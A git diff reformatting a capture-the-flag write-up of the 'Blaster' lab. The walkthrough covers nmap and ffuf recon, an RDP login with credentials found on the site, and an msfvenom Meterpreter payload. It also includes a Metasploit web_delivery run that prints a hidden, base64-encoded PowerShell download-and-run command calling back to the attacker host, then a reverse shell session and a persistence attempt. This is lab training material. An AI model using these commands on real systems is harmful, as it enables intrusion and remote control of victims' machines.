@@ -26,8 +26,7 @@ Time to take aim and take a shot at Blaster.
 
 Run nmap to get a list of services running on top ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/blaster]
 └─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.168.212
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 01:29 AEDT
@@ -70,8 +69,8 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 41.75 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Check the landing page running on the webserver.
@@ -85,8 +84,7 @@ Check the landing page running on the webserver.
 <br />
 Run the FFUF to try and brute-force any interesting files and directories.
 
-{% raw %}
-```bash
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/thm/blaster]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.168.212/FUZZ -e .txt,.bak,.html -fs 703
 
@@ -113,8 +111,8 @@ ________________________________________________
 ________________________________________________
 
 retro                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 343ms]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Check the /retro directory.
@@ -137,8 +135,7 @@ Check the posts and comments.  Hey!  A possible username and password.  Neato mo
 <br />
 RDP with the credentials that we just found.
 
-{% raw %}
-```bash
+{% capture waderdp %}
 ┌──(kali㉿kali)-[~/Documents/thm/blaster]
 └─$ xfreerdp /u:wade /p:parzival /v:10.10.168.212 /dynamic-resolution +clipboard
 [01:41:12:070] [61693:61694] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
@@ -166,14 +163,13 @@ Do you trust the above certificate? (Y/T/N) Y
 [01:41:20:691] [61693:61694] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
 [01:41:20:691] [61693:61694] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
 [01:41:22:975] [61693:61694] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=waderdp %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 C:\Users\Wade\Desktop>type user.txt.txt
 <redacted>
 C:\Users\Wade\Desktop>ipconfig
@@ -200,8 +196,8 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}
 
 <br />
 Check the Internet Explorer history.  Nothing.  Drats!
@@ -325,8 +321,7 @@ Get the root.txt flag.
 <br />
 Use msfvenom to generate a meterpreter payload.
 
-{% raw %}
-```bash
+{% capture genmeterexe %}
 ┌──(kali㉿kali)-[~/Documents/thm/blaster]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.119.29 LPORT=4444 -f exe -o meter.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -339,25 +334,23 @@ Saved as: meter.exe
 ┌──(kali㉿kali)-[~/Documents/thm/blaster]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genmeterexe %}
 
 <br />
 Choose to use web_delivery exploit.
 
-{% raw %}
-```bash
+{% capture usewebdelivery %}
 ┌──(kali㉿kali)-[~/Documents/thm/blaster]
 └─$ msfconsole -q                                                                               
 msf6 > use exploit/multi/script/web_delivery
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=usewebdelivery %}
 
 <br />
 Show all of the available targets.
 
-{% raw %}
-```bash
+{% capture showtargets %}
 msf6 exploit(multi/script/web_delivery) > show targets
 
 Exploit targets:
@@ -374,14 +367,13 @@ Exploit targets:
     6   PSH (Binary)
     7   Linux
     8   Mac OS X
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=showtargets %}
 
 <br />
 Set all of the options associated with the payload and then run as a job.
 
-{% raw %}
-```bash
+{% capture runmeterpowershellpayload %}
 msf6 exploit(multi/script/web_delivery) > set lhost tun0
 lhost => 10.4.119.29
 msf6 exploit(multi/script/web_delivery) > set lhost tun0
@@ -401,8 +393,8 @@ msf6 exploit(multi/script/web_delivery) >
 [*] Server started.
 [*] Run the following command on the target machine:
 powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB4AHoAMgBKAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHgAegAyAEoALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAB4AHoAMgBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANAAuADEAMQA5AC4AMgA5ADoAOAAwADgAMAAvAEoATQA5AEUAbQBLAEkANgBKAFQAYwBoAC8AagA2AHMAegAyAFEAbQBZAHoAdABqAGwAdgAwACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgA0AC4AMQAxADkALgAyADkAOgA4ADAAOAAwAC8ASgBNADkARQBtAEsASQA2AEoAVABjAGgAJwApACkAOwA=
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runmeterpowershellpayload %}
 
 <br />
 Execute the powershell command.
@@ -416,16 +408,15 @@ Execute the powershell command.
 <br />
 Check the Meterpreter and catch the session.
 
-{% raw %}
-```bash
+{% capture catchmetersession %}
 [*] 10.10.168.212    web_delivery - Delivering AMSI Bypass (1377 bytes)
 [*] 10.10.168.212    web_delivery - Delivering Payload (4061 bytes)
 [!] http://10.4.119.29:4445 handling request from 10.10.168.212; (UUID: e9c2agrp) Without a database connected that payload UUID tracking will not work!
 [*] http://10.4.119.29:4445 handling request from 10.10.168.212; (UUID: e9c2agrp) Staging x86 payload (178780 bytes) ...
 [!] http://10.4.119.29:4445 handling request from 10.10.168.212; (UUID: e9c2agrp) Without a database connected that payload UUID tracking will not work!
 [*] Meterpreter session 1 opened (10.4.119.29:4445 -> 10.10.168.212:49864) at 2025-03-02 02:28:06 +1100
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchmetersession %}
 
 <br />
 Research meterpreter services for something that runs at startup.
@@ -435,8 +426,7 @@ Research meterpreter services for something that runs at startup.
 <br />
 Drop into that session.
 
-{% raw %}
-```bash
+{% capture dropintosession1 %}
 sessions
 
 Active sessions
@@ -450,20 +440,19 @@ msf6 exploit(multi/script/web_delivery) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=dropintosession1 %}
 
 <br />
 Try running the choice from the article.
 
-{% raw %}
-```bash
+{% capture runpersistence %}
 meterpreter > run persistence -X
 [!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
 [!] Example: run exploit/windows/local/persistence OPTION=value [...]
 [-] The specified meterpreter session script could not be found: persistence
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpersistence %}
 
 <br />
 And with that we blasted through another one.  Thanks for reading.  See you in the next one!
